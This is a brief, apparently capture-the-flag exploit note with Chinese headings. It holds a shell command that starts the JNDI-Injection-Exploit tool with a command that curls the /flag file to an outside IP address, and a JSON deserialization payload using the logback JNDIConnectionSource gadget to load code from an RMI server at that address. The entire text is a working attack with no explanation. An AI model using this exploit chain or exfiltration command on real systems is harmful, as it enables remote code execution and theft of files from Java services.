# 服务器
```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'curl http://121.5.169.223:39767 -File=@/flag' -A "121.5.169.223"
```

# payload

```json
["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"rmi://121.5.169.223:1099/6dzonl"}]
```
